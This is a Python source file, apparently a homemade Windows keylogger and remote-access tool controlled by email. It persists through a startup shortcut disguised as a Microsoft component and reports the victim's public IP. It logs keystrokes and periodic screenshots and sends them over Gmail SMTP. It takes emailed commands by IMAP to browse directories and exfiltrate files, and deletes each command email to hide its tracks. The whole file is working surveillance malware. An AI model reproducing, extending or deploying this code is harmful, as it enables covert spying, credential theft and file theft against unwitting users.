import keyboard
import os
import smtplib
import winshell
import imaplib
import threading
from time import sleep
from email import message_from_bytes
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from pyautogui import screenshot as pagscreen
from requests import get as request_get

# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ДЛЯ ПОЧТЫ И РАБОТЫ ПРОГИ
input_text_global = ""  # для текста

# server settings
sender_global = "sender_example@gmail.com"
sender_password_global = "application password for sender"
receiver_global = "receiver_example@gmail.com"

# Dir variables
current_path_global = ""
user_wants_position_global = ""
string_path_global = ""

# global server variables are not defined because of code issues with global server variables

ONLY_TEXT = True  # Отсылать только текст
ONLY_IMAGE = False  # Только картинку
SLEEP = False  # Ничего не делать, ожидать команд
KILL = False  # Самоуничтожение и удаление ярлыка из автозагрузки. Следов и свидетелей не будет.
SHT_D = False

x = 0

# Functions
def KILL_PROGRAM():
    # i will add it
    pass

def WRITE_TO_THE_AUTOSTART():
    try:
        startup = winshell.startup()
        program_path = os.path.realpath(__file__)
        shortcut_path = os.path.join(startup, "Windows VBS Helper.lnk")
        if os.path.exists(shortcut_path):
            return  # return is empty МОЖНО ПРОСТО PASS
        else:
            shortcut = winshell.shortcut(program_path)
            shortcut.description = "Microsoft Windows secondary component. Windows VBS helper v. 23H4"
            shortcut.write(shortcut_path)
    except Exception as e:
        pass

def GET_GLOBAL_IP():
    try:
        url = 'https://api.ipify.org'
        response = request_get(url)
        ip_address = response.text
        SEND_EMAIL_TEXT_MESSAGE(ip_address)
    except Exception as _ex:
        pass

def SEND_EMAIL_TEXT_MESSAGE(message):
    try:
        gmail_server = smtplib.SMTP("smtp.gmail.com", 587)
        gmail_server.starttls()
        gmail_server.login(sender_global, sender_password_global)
        g_message = MIMEMultipart()
        g_message.attach(MIMEText(message, 'plain'))
        gmail_server.sendmail(sender_global, receiver_global, g_message.as_string())
    except Exception as _ex:
        pass

def SEND_EMAIL_SCREENSHOT_NOW():
    try:
        gmail_server = smtplib.SMTP("smtp.gmail.com", 587)
        gmail_server.starttls()
        gmail_server.login(sender_global, sender_password_global)

        screenshot = pagscreen()
        screenshot.save('screenshot.png')
        g_message = MIMEMultipart()
        img_data = open('screenshot.png', 'rb').read()
        image = MIMEImage(img_data, 'png')
        g_message.attach(image)

        gmail_server.sendmail(sender_global, receiver_global, g_message.as_string())
    except Exception as _ex:
        pass

def SEND_FILE_AS_FILE(filename):
    try:
        gmail_server = smtplib.SMTP("smtp.gmail.com", 587)
        gmail_server.starttls()
        gmail_server.login(sender_global, sender_password_global)
        msg = MIMEMultipart()
        with open(filename, "rb") as fil:
            part = MIMEApplication(fil.read(), Name=filename)
            part["Content-Disposition"] = f'attachment; filename="{filename}"'
            msg.attach(part)
        gmail_server.sendmail(sender_global, receiver_global, msg.as_string())
    except Exception as _ex:
        print("There is an error")

# DIRS
def GET_CURRENT_DIR():
    try:
        current_path_global = os.getcwd()
        # To list to string, we need to build a string
        lego0 = current_path_global
        lego1 = "Current dir : "
        lego3 = os.listdir()
        lego2 = "\n\nPROBABLY POSITIONS AND FILES : \n\n\n"
        lego4 = '  \n'.join(lego3)
        # builded
        message = "\n" + lego1 + lego0 + lego2 + lego4
        SEND_EMAIL_TEXT_MESSAGE(message)
    except Exception as _ex:
        pass

def GO_TO_DIR(user_wants_position):
    try:
        os.chdir(user_wants_position)
        current_path_global = os.getcwd()
        dirfiles = os.listdir()
        lego0 = "Successfully going to : "
        lego1 = current_path_global
        lego2 = " \n".join(dirfiles)
        lego3 = "\n\nPROBABLY POSITIONS AND FILES : \n\n\n"
        message_ = lego0 + lego1 + lego3 + lego2
        SEND_EMAIL_TEXT_MESSAGE(message_)
    except Exception as _ex:
        message = " The error while going to another dir. I'm in this dir right now: " + os.getcwd()
        SEND_EMAIL_TEXT_MESSAGE(message)

def GET_FILE_SIZE(filename):
    try:
        message = filename + " FILE SIZE IN BYTES : " + str(os.path.getsize(filename))
        SEND_EMAIL_TEXT_MESSAGE(message)
    except Exception as _ex:
        message = " Not successful checked file size "
        SEND_EMAIL_TEXT_MESSAGE(message)

def DOWNLOAD_FILE(filename, filepath):
    pass

def SEND_FILE_AS_ARCHIVE(filename):
    pass

# The Machine
def KEY_LOGGER():
    global input_text_global
    while ONLY_TEXT:
        sleep(0.001)
        event = keyboard.read_event()
        if not ONLY_TEXT:
            break
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            print(key)
            if key == 'space':
                input_text_global += " "
            elif key == 'enter':
                SEND_EMAIL_TEXT_MESSAGE('INPUT TEXT :' + input_text_global)
                input_text_global = ""
            elif key == "ctrl":
                input_text_global += " CTRL "
            elif key == "shift":
                input_text_global += " SHIFT "
            elif key == "alt":
                input_text_global += " ALT "
            elif key == "caps":
                input_text_global += " CAPS "
            elif key == "lock":
                input_text_global += " LOCK "
            elif key == "backspace":
                input_text_global += " BACKSPACE "
            else:
                input_text_global += key

def SCREEN_LOGGER():
    while ONLY_IMAGE:
        sleep(17)
        SEND_EMAIL_SCREENSHOT_NOW()

def SLEEP_FUN():
    while SLEEP:
        sleep(10)

def SEND_ALL_FROM_input_text_global():
    SEND_EMAIL_TEXT_MESSAGE(input_text_global)


# The functions and commands loop-'while'-free are in function CHECK_COMMANDS_PROMTS
def CHECK_COMMADS_PROMTS():
    global SLEEP
    global ONLY_IMAGE
    global ONLY_TEXT
    mail_server = "imap.gmail.com"
    while True:
        sleep(5)
        mail = imaplib.IMAP4_SSL(mail_server)
        mail.login(sender_global, sender_password_global)
        # SELECTING IN MAIL MY FOLDER FOR SORTING MESSAGES!!! IF YOU DONT HAVE FOLDER, WRITE mai.select("all") or "inbox"
        mail.select("MYORDER") 
        result, data = mail.search(None, 'ALL')
        email_ids = data[0].split()
        for email_id in email_ids[-5:]:
            result, msg_data = mail.fetch(email_id, '(RFC822)')
            raw_email = msg_data[0][1]
            msg = message_from_bytes(raw_email)

            if msg["Subject"] == "GET_IP":
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
                GET_GLOBAL_IP()
            elif msg["Subject"] == "GET_CURRENT_DIR":
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
                GET_CURRENT_DIR()
            elif msg["Subject"] == "SEND_SCREEN":
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
                SEND_EMAIL_SCREENSHOT_NOW()
            elif msg["Subject"] == "GO_TO":
                if msg.is_multipart():
                    for part in msg.get_payload():
                        if part.get_content_type() == "text/plain":
                            body = part.get_payload(decode=True)
                            body = body.decode().strip()
                GO_TO_DIR(body)
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            elif msg["Subject"] == "GET_SIZE":
                if msg.is_multipart():
                    for part in msg.get_payload():
                        if part.get_content_type() == "text/plain":
                            body = part.get_payload(decode=True)
                            body = body.decode().strip()
                GET_FILE_SIZE(body)
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            elif msg["Subject"] == "SEND_FILE":
                if msg.is_multipart():
                    for part in msg.get_payload():
                        if part.get_content_type() == "text/plain":
                            body = part.get_payload(decode=True)
                            body = body.decode().strip()
                SEND_FILE_AS_FILE(body)
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            elif msg["Subject"] == "K_LOG_ON":
                ONLY_TEXT = True
                ONLY_IMAGE = False
                SLEEP = False
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            elif msg["Subject"] == "S_LOG_ON":
                ONLY_IMAGE = True
                ONLY_TEXT = False
                SLEEP = False
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            elif msg["Subject"] == "SLEEP_ONLY":
                SLEEP = True
                ONLY_IMAGE = False
                ONLY_TEXT = False
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            elif msg["Subject"] == "SEND_TEXT_GLOBAL":
                SEND_ALL_FROM_input_text_global()
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
        mail.logout()

# Creating threads with functions
# First just for command check and bool variables changer
def COMMAND_CHECK_TRD():
    global ONLY_TEXT
    global ONLY_IMAGE
    global SLEEP
    CHECK_COMMADS_PROMTS()

def WHILE_LOOP_COMPORATOR():
    global ONLY_TEXT
    global ONLY_IMAGE
    global SLEEP
    while True:
        sleep(0.2)
        if ONLY_TEXT:
            KEY_LOGGER()
        elif ONLY_IMAGE:
            SCREEN_LOGGER()
        elif SLEEP:
            SLEEP_FUN()
        # elif will be later

WRITE_TO_THE_AUTOSTART()
GET_GLOBAL_IP()

t2 = threading.Thread(target=WHILE_LOOP_COMPORATOR)
t1 = threading.Thread(target=COMMAND_CHECK_TRD)

t1.start()
t2.start()
